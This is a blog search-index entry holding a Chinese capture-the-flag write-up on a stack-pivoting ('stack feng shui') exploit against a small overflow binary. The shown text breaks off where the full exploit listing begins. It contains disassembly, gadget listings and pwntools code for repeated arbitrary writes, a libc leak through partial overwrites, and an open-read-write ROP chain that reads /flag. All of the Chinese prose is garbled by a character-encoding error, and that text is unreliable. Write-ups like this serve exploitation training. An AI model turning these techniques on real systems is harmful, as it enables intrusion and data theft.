<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ğŸ”¥ æ ˆé£æ°´</title>
      <link href="/2026/01/29/college/2026-01-29-%E6%A0%88%E9%A3%8E%E6%B0%B4/"/>
      <url>/2026/01/29/college/2026-01-29-%E6%A0%88%E9%A3%8E%E6%B0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ ˆé£æ°´â€”-&gt; ä¸€åˆ‡éå¸¸è§„çš„å¸ƒå±€éƒ½æ˜¯æ ˆé£æ°´ï¼Œæˆ‘è®¤ä¸ºå®é™…ä¸Šæ˜¯å¯¹äºæ‰€æœ‰æ ˆçŸ¥è¯†çš„çµæ´»ç»„åˆè¿ç”¨ã€‚æ‰€ä»¥é‡åœ¨çµæ´»å˜é€š</p><p>è¿™é“é¢˜çš„æ ˆé£æ°´åœ¨äºåˆ©ç”¨ä»»æ„åœ°å€å†™ï¼Œå®ç°ä»»æ„æ¬¡æ•°çš„ä»»æ„åœ°å€å†™ï¼Œå¹¶ä¸”åœ¨ç¨‹åºä½¿ç”¨startçš„æ—¶å€™ä¼šåœ¨æ ˆä¸Šç•™ä¸‹libcçš„åœ°å€ï¼Œé€šè¿‡ä¿®æ”¹libcçš„åœ°å€ï¼Œçˆ†ç ´ä½¿å¾—åœ°å€æ³„æ¼ï¼›ä¸è¿‡ç”±äºçˆ†ç ´éœ€è¦éå¸¸å¤šçš„æ—¶é—´ï¼Œæ‰€ä»¥æˆ‘ä¼šå…³é—­åœ°å€éšæœºåŒ–,å¹¶ä¸”æˆ‘çš„è„šæœ¬ä¸ä¼šæœ‰çˆ†ç ´çš„æ­¥éª¤ï¼Œå› ä¸ºéå¸¸è´¹æ—¶é—´ï¼›</p><h1 id="é¢˜"><a href="#é¢˜" class="headerlink" title="é¢˜:"></a>é¢˜:</h1><p>æˆ‘ä»¬æ¥è¯´ä¸€ä¸‹è¿™ä¸ªé¢˜å§</p><p><a href="https://github.com/CAO-PNG/Source/tree/main/PWN_CHALLANGE/vn%E9%9D%A2%E8%AF%95/vn%E9%9D%A2%E8%AF%95/1">é“¾æ¥</a></p><p>ç¨‹åºéå¸¸ç®€å•ï¼šåªæœ‰ä¸€ä¸ªmainå‡½æ•°ï¼Œå¹¶ä¸”ä»…ä»…æº¢å‡º0x10çš„å­—èŠ‚ï¼Œï¼Œæ‰€ä»¥ä»…ä»…å¤Ÿè¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶ä¸”ç¨‹åºé‡Œé¢å¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åé—¨å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401288 ; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401288                 public main</span><br><span class="line">.text:0000000000401288 main            proc near               ; DATA XREF: _start+18â†‘o</span><br><span class="line">.text:0000000000401288</span><br><span class="line">.text:0000000000401288 buf             = byte ptr -8</span><br><span class="line">.text:0000000000401288</span><br><span class="line">.text:0000000000401288 ; __unwind &#123;</span><br><span class="line">.text:0000000000401288                 endbr64</span><br><span class="line">.text:000000000040128C                 push    rbp</span><br><span class="line">.text:000000000040128D                 push    rbx</span><br><span class="line">.text:000000000040128E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401291                 sub     rsp, 8</span><br><span class="line">.text:0000000000401295                 mov     rdi, 0          ; fd</span><br><span class="line">.text:000000000040129C                 lea     rsi, [rbp+buf]  ; buf</span><br><span class="line">.text:00000000004012A0                 mov     rdx, 20h ; &#x27; &#x27;  ; nbytes</span><br><span class="line">.text:00000000004012A7                 call    _read</span><br><span class="line">.text:00000000004012AC                 add     rsp, 8</span><br><span class="line">.text:00000000004012B0                 pop     rbx</span><br><span class="line">.text:00000000004012B1                 pop     rbp</span><br><span class="line">.text:00000000004012B2                 retn</span><br><span class="line">.text:00000000004012B2 main            endp</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ˜¯å¯ä»¥æ³¨æ„åˆ°ç¨‹åºæ”¶æ ˆçš„ç»“æ„å’Œæˆ‘ä»¬æ­£å¸¸çš„<code>leave ret</code>ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œçš„æ•ˆæœç›¸å½“äº<code>leave ret</code> ï¼Œä½†æ˜¯ä¸æ¶‰åŠåˆ°<code>rbp</code>ï¼Œ ä¹Ÿå°±æ˜¯è¯´<code>rbp</code>ä¸å½±å“æ ˆã€‚é‚£ä¹ˆè¿™é‡Œå°±æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿äº†ï¼Œ</p><p>çœ‹åˆ°è¿™éƒ¨åˆ†æ±‡ç¼–ï¼šæˆ‘ä»¬ä¼šå‘ç°ä»readè¯»è¿›å»çš„åœ°æ–¹æ˜¯ç”±<code>rsi</code>æ§åˆ¶çš„ ï¼Œä½†æ˜¯<code>rsi</code>åˆæ˜¯ç”±<code>rbp</code>å¯»å€æ‰¾åˆ°<code>buf</code>æ§åˆ¶çš„ ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæœ€åçš„<code>pop rbp</code>æ¥æ§åˆ¶ä¸‹ä¸€æ¬¡è¯»è¿›å»çš„åœ°æ–¹ï¼Œè¿™å°±æ˜¯ä»»æ„åœ°å€å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401295                 mov     rdi, 0          ; fd</span><br><span class="line">.text:000000000040129C                 lea     rsi, [rbp+buf]  ; buf</span><br><span class="line">.text:00000000004012A0                 mov     rdx, 20h ; &#x27; &#x27;  ; nbytes</span><br><span class="line">.text:00000000004012A7                 call    _read</span><br></pre></td></tr></table></figure><p>è€Œåœ¨å‰é¢æˆ‘ä»¬åˆçŸ¥é“ï¼Œ<code>rsp</code>å¹¶ä¸å—<code>rbp</code>å½±å“(å› ä¸ºæ­£å¸¸çš„<code>rsp</code>æ˜¯ç”±<code>mov rsp,rbp</code>æ¥æ§åˆ¶çš„)ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†<code>rsp</code>æ”¾åœ¨ä¸€ä¸ªæ»¡æ˜¯<code>main</code>çš„æˆ–è€…<code>0x401295ï¼ˆreadå¼€å§‹çš„åœ°æ–¹ï¼‰  </code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ— é™çš„è¯»åˆ°ä»»æ„åœ°å€äº†ï¼Œå¹¶ä¸”ä»¥æ­¤å¾ªç¯ï¼å¦‚æœ<code>rsp</code>å’Œ<code>rbp</code>åœ¨ä¸€èµ·ä¼šæ˜¯ä»€ä¹ˆæ ·å­ï¼Ÿ<code>rsp</code>ä¼šç ´åæ‰æˆ‘ä»¬çš„å¸ƒç½®å¥½äº†çš„æ•°æ®(<code>rsp</code>æ‰€åœ¨çš„åœ°æ–¹ç¨‹åºä¼šè¿”å›ï¼Œå¯¼è‡´æˆ‘ä»¬çš„æ•°æ®è¢«ä¸€äº›åœ°å€è¦†ç›–æ‰)</p><p>æ— é™æ¬¡æ•°çš„ä»»æ„åœ°å€å†™æˆç«‹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦æˆ‘ä»¬å»æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼<code>libc</code>ï¼Œè€Œç¨‹åºæ˜¯æ²¡æœ‰ä»»ä½•æœ‰å…³äºæ§åˆ¶å¯„å­˜å™¨çš„<code>gadget</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â¯ ROPgadget --binary ./pwn --only <span class="string">&quot;pop|ret&quot;</span>                                                                                                                                                   î´›  3.13.1 ïº 20:36</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004012b0 : pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x00000000004012a2 : ret 0x20</span><br><span class="line">0x0000000000401252 : ret 0x2be</span><br><span class="line">0x000000000040105a : ret 0xffff</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘ä¸€ä¸‹æˆ‘ä»¬çš„<code>_start</code>äº†ï¼Œè¿™ä¸ªå‡½æ•°ç›¸ä¿¡å¤§å®¶éƒ½ä¸é™Œç”Ÿï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯ç¨‹åºçœŸæ­£çš„å…¥å£ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401090                 public _start</span><br><span class="line">.text:0000000000401090 _start          proc near               ; DATA XREF: LOAD:00000000003FF018â†‘o</span><br><span class="line">.text:0000000000401090 ; __unwind &#123;</span><br><span class="line">.text:0000000000401090                 endbr64</span><br><span class="line">.text:0000000000401094                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401096                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000401099                 pop     rsi             ; argc</span><br><span class="line">.text:000000000040109A                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:000000000040109D                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004010A1                 push    rax</span><br><span class="line">.text:00000000004010A2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004010A3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000004010A6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000004010A8                 mov     rdi, offset main ; main</span><br><span class="line">.text:00000000004010AF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000004010B5                 hlt</span><br><span class="line">.text:00000000004010B5 ; &#125; // starts at 401090</span><br><span class="line">.text:00000000004010B5 _start          endp</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸€ä¸ªå«<code>__libc_start_main</code>çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>__libc_start_call_main</code>ï¼Œä»è€Œè°ƒç”¨<code>main</code>å‡½æ•°ï¼Œè€Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ<code>__libc_start_main</code>ä¹Ÿæ˜¯éœ€è¦ä¿å­˜è¿”å›åœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶å¸¸è§çš„ç”¨äºæ”¶å°¾çš„å‡½æ•°ï¼Œ</p><img src="/2026/01/29/college/2026-01-29-%E6%A0%88%E9%A3%8E%E6%B0%B4/first-1.png" class><p>è€Œè¿™ä¸ªå‡½æ•°æ˜¯<code>libc</code>çš„å‡½æ•°ï¼Œæ‰€ä»¥ï¼Œå®ƒçš„è¿”å›åœ°å€ä¹Ÿæ˜¯<code>libc</code>ä¸Šçš„åœ°å€ï¼Œè€Œå®ƒä¼šè¦†ç›–åœ¨<code>rbp-0x10</code>çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¿”å›åœ°å€ã€‚é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯åªéœ€è¦æˆ‘ä»¬å»è°ƒç”¨startå°±ä¼šåœ¨æ ˆä¸Šç•™ä¸‹<code>libc</code>çš„åœ°å€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦åŒæ—¶å¾—åˆ°ä¸¤ä¸ª<code>libc</code>çš„åœ°å€ï¼Œå°†åœ°å€ä½çš„é‚£ä¸ªä¿®æ”¹æˆ<code>libc</code> ä¸­çš„<code>pop rdi ;ret</code>ï¼Œç„¶åç´§æŒ¨ç€æ”¾ä¸€ä¸ªgotè¡¨çš„åœ°å€ï¼Œå¦ä¸€ä¸ªä¿®æ”¹æˆ<code>libc</code>é‡Œé¢çš„<code>puts</code>ï¼Œä¸­é—´ä½¿ç”¨<code>ret</code>è¿æ¥èµ·æ¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ³„æ¼åœ°å€ï¼Œ</p><p>ä¹‹åå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æ‰¾ä¸ªåˆé€‚çš„ä½ç½®æ‰“<code>ORW</code>å³å¯</p><p>ä½†æ˜¯æ³„æ¼åœ°å€è¿™ä¸€å—ï¼Œå¦‚æœæ˜¯åœ¨æ ˆåœ°å€ä¸Šï¼Œæˆ‘ä»¬å…¶å®æ˜¯ä¸å¥½ç”¨çš„ï¼Œå› ä¸ºæ ˆåœ°å€æœªçŸ¥ï¼Œä¸æ–¹ä¾¿æˆ‘ä»¬çš„é£æ°´æ„å»ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿ç§»åˆ°<code>.bss/.data</code>æ®µä¸Šï¼Œä½†æ˜¯ï¼Œå¦‚æœç›´æ¥è¿ç§»åˆ°<code>bss</code>ä¸Šä¼šå¯¼è‡´æˆ‘ä»¬æ— æ³•æ­£å¸¸çš„è¿”å›ï¼Œå› ä¸º<code>bss</code>ä¸Šæ²¡æœ‰æ­£å¸¸çš„è¿”å›åœ°å€ï¼Œå¹¶ä¸”<code>bss</code>ä¸Šæœ‰ä¸€äº›é‡è¦çš„æ•°æ®ï¼Œæ¯”å¦‚IOç»“æ„ä½“ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠæ ˆæŠ¬é«˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp_test</span></span><br><span class="line">s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss1) + p64(read_to))</span><br><span class="line"> <span class="comment"># bug()</span></span><br><span class="line"> s(p64(main) * <span class="number">4</span>)</span><br><span class="line"> s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss1) + p64(start))</span><br><span class="line">  pause()</span><br></pre></td></tr></table></figure><p>è¿™æ ·æµ‹è¯•å°±ä¼šå‘ç°å¯ä»¥æ­£å¸¸è¿”å›</p><img src="/2026/01/29/college/2026-01-29-%E6%A0%88%E9%A3%8E%E6%B0%B4/first-3.png" class><p>ä½†æ˜¯æ˜¾ç„¶ï¼Œè¿™æ ·çš„å†™æ³•å®è´¨ä¸Šæ˜¯å¤§é‡é‡å¤çš„å·¥ä½œï¼Œè€Œä¸”éœ€è¦ä¸æ–­è®¡ç®—åœ°å€ï¼Œæå…¶ä¸å¥åº·</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è£…æˆå‡½æ•°ï¼Œæ–¹ä¾¿æˆ‘ä»¬éšæ—¶è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_qword</span>(<span class="params">addr, data, do_pause=<span class="literal">False</span>, restart=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) &lt;= <span class="number">0x20</span></span><br><span class="line">    s(p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(addr + <span class="number">8</span>) + p64(read_to))</span><br><span class="line">    s(data)</span><br><span class="line">    <span class="keyword">if</span> do_pause:</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pulse()</span><br><span class="line">    <span class="keyword">if</span> restart:</span><br><span class="line">        io.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(elf.sym[<span class="string">&quot;_start&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">addr, data, do_pause=<span class="literal">False</span>, restart=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">0x20</span>):</span><br><span class="line">        write_to_qword(addr + i, data[i : i + <span class="number">0x20</span>], do_pause, restart)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_mov</span>(<span class="params">rbp</span>):</span><br><span class="line">    s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(rbp - <span class="number">8</span>) + p64(leave_ret))</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä»»æ„é•¿åº¦ä»»æ„åœ°å€å†™äº†ï¼Œ</p><p>ç„¶åæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç¨å¾®å¸ƒç½®ä¸€ä¸‹æ ˆç»“æ„äº†(ä¹Ÿå°±æ˜¯æ‰€è°“çš„é£æ°´). é¦–å…ˆï¼Œæˆ‘ä»¬æˆ‘ä»¬è‚¯å®šæ˜¯éœ€è¦å¸ƒç½®æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„<code>libc</code>çš„åœ°å€çš„ï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ª<code>start</code>,è€Œç”±äº<code>main</code>æœ€åä¼šå¼¹3ä¸ª<code>qword</code>ï¼Œæ‰€ä»¥ä¸¤ä¸ª<code>start</code>çš„åœ°å€ä¹‹é—´è‡³å°‘æœ‰4<code>qword</code>,ä¹Ÿå°±æ˜¯è¿™æ ·å¸ƒå±€çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_data(bss1, p64(start) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(start) + p64(<span class="number">0</span>) + <span class="string">b&quot;/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿æŠŠ<code>flag</code>å­—ç¬¦ä¸²å¸ƒç½®å¥½ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆè¿ç§»åˆ°ç¬¬ä¸€ä¸ª<code>start</code>,å°±å¯ä»¥ç•™ä¸‹<code>libc</code>çš„åœ°å€ï¼Œå†è¦†ç›–è¿”å›çš„ é‚£ä¸ª<code>libc</code>çš„åœ°å€ä¸º<code>libc </code>ä¸­çš„<code>leave;ret</code>ï¼Œæ ˆè¿ç§»åˆ°<code>rsp1+0x30-8</code>ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ª<code>start</code>,è¿™æ ·è¿›è¡Œæ ˆè¿ç§»çš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥è¿›è¡Œçˆ†ç ´ï¼Œè¿™æ ·åªéœ€è¦çˆ†ç ´ä¸€æ¬¡ï¼Œå¯ä»¥å‡å°‘ä¸€æ¬¡æ€§çˆ†ç ´çš„æ—¶é—´ã€‚ç„¶ååŒæ—¶ä¼šç•™ä¸‹ä¸€ä¸ª<code>libc</code>çš„åœ°å€ï¼Œè¿™ä¸¤ä¸ª<code>libc</code>çš„åœ°å€è·ç¦»å°±ä¼šå¾ˆè¿‘ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write_data(bss2, p64(main) * <span class="number">4</span> * <span class="number">12</span>)</span><br><span class="line">write_data(bss3, p64(main) * <span class="number">4</span> * <span class="number">30</span>)</span><br><span class="line">stack_mov(bss1)</span><br><span class="line"></span><br><span class="line">s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss1 + <span class="number">0x30</span> - <span class="number">8</span>) + p16(libc_leave_ret_low))</span><br><span class="line">s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss2 - <span class="number">8</span>) + p16(libc_leave_ret_low))</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œå°±å¯ä»¥å°±è¿™ä¸¤ä¸ª<code>libc</code>åœ°å€å¸ƒç½®<code>pop rdi;ret</code>å’Œ<code>puts</code>çš„<code>ROP</code>äº†ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿéœ€è¦æ³¨æ„è¿™ä¸ª<code>ROP</code>çš„è¿”å›ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ç›´æ¥è¿”å›åˆ°<code>rsp2</code>ï¼Œè¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥å¸ƒç½®æˆ‘ä»¬åé¢çš„<code>ORW</code>äº†ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">write_data(bss1 - <span class="number">0x108</span>, p32(libc_pop_rdi_low)[:<span class="number">3</span>], restart=<span class="literal">False</span>)</span><br><span class="line">write_data(</span><br><span class="line">    bss1 - <span class="number">0x100</span>,</span><br><span class="line">    p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(ret) * <span class="number">4</span> + p32(libc_puts_lower)[:<span class="number">3</span>],</span><br><span class="line">    restart=<span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">write_data(</span><br><span class="line">    bss1 - <span class="number">0x100</span> + <span class="number">8</span> * <span class="number">6</span>,</span><br><span class="line">    p64(rbp_ret) + p64(bss3 - <span class="number">8</span>) + p64(leave_ret),</span><br><span class="line">    restart=<span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">stack_mov(bss1 - <span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">libc_base = l64() - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ­£å¸¸çš„<code>ORW</code>ï¼Œç„¶åæ ˆè¿ç§»å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010F75B</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000110A4D</span></span><br><span class="line">pop_rdx_leave_ret = libc_base + <span class="number">0x00000000000981AD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] ============== ORW ============== [+]</span></span><br><span class="line">O = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">        <span class="number">0x8</span>: flag_path,</span><br><span class="line">        <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">        <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x20</span>: libc_base + libc.sym[<span class="string">&quot;open&quot;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;&quot;</span>,</span><br><span class="line">)</span><br><span class="line">R = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">        <span class="number">0x8</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">        <span class="number">0x18</span>: read_to_flag,</span><br><span class="line">        <span class="number">0x20</span>: rbp_ret,</span><br><span class="line">        <span class="number">0x28</span>: bss4 + <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x30</span>: pop_rdx_leave_ret,</span><br><span class="line">        <span class="number">0x38</span>: <span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x40</span>: libc_base + libc.sym[<span class="string">&quot;read&quot;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;&quot;</span>,</span><br><span class="line">)</span><br><span class="line">W = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">        <span class="number">0x8</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">        <span class="number">0x18</span>: read_to_flag,</span><br><span class="line">        <span class="number">0x20</span>: rbp_ret,</span><br><span class="line">        <span class="number">0x28</span>: bss4 + <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0x30</span>: pop_rdx_leave_ret,</span><br><span class="line">        <span class="number">0x38</span>: <span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x40</span>: libc_base + libc.sym[<span class="string">&quot;write&quot;</span>],</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">orw = O + R + W</span><br><span class="line">write_data(bss4, orw, restart=<span class="literal">False</span>)</span><br><span class="line">stack_mov(bss4)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å®Œæ•´çš„exp"><a href="#å®Œæ•´çš„exp" class="headerlink" title="å®Œæ•´çš„exp"></a>å®Œæ•´çš„exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 